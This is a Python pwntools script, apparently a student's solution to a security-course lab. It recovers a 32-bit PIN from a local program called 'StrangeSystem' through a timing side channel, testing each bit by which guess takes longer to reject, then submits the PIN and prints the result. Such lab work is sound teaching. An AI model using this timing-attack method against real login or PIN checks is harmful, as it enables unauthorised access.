from pwn import *
import time

def main():
   # command = '/home/ehiane/Desktop/WSU_Classes/CPTS_327/StrangeSystem'
    command = "./StrangeSystem"
    proc = process(command)

    # Log in process
    proc.sendline(b"11755265")  # Replace with your actual WSU ID
    proc.recvuntil(b"[+] Enter your 32-bits PIN code (in binary form like PIN in pincode.log):")

    # Initialize testing for the first bit
    initial_bits = ['0', '1']
    correct_pin = ''
    times = []

    # Test both possibilities for the first bit
    for bit in initial_bits:
        test_pin = bit + ('0' * 31)  # Assume the rest are '0'
        proc.sendline(test_pin.encode())
        start_time = time.time()
        proc.recvuntil(b"[***] ERROR: Verification failed!")
        end_time = time.time()
        times.append(end_time - start_time)

        # Reset for the next test
        proc.sendline(b"yes")

    # Determine which initial bit is more likely correct based on longer response time
    correct_pin += initial_bits[times.index(max(times))]

    # Continue with the rest of the bits
    try:
        for i in range(1, 32):  # Now determine the remaining 31 bits
            bit_string_1 = correct_pin + '0' + ('0' * (31 - i))
            bit_string_2 = correct_pin + '1' + ('0' * (31 - i))

            # Send the first bit string
            proc.sendline(bit_string_1.encode())
            start_time = time.time()
            proc.recvuntil(b"[***] ERROR: Verification failed!")
            end_time = time.time()
            response_time1 = end_time - start_time
            
            # Send 'yes' to continue trying
            proc.sendline(b"yes")
            
            # Send the second bit string
            proc.sendline(bit_string_2.encode())
            start_time = time.time()
            proc.recvuntil(b"[***] ERROR: Verification failed!")
            end_time = time.time()
            response_time2 = end_time - start_time
            
            # Send 'yes' to continue trying
            proc.sendline(b"yes")
            
            # Determine which bit string is slower/more correct
            if response_time1 > response_time2:
                correct_pin += '0'
            else:
                correct_pin += '1'

            print(f"After testing bit {i+1}, correct PIN so far: {correct_pin}")

        # Send the complete correct PIN
        proc.sendline(correct_pin.encode())  # Send the determined correct PIN

        # Wait and print the expected secret value or any other message
        output = proc.recvall(timeout=600)  # Set timeout to 10 minutes
        print("Received response:", output.decode())

    except EOFError:
        print("Caught EOFError - the process may have terminated unexpectedly.")
    except Exception as e:
        print(f"An error occurred: {e}")

    finally:
        proc.close()
        print("Process closed.")

main()
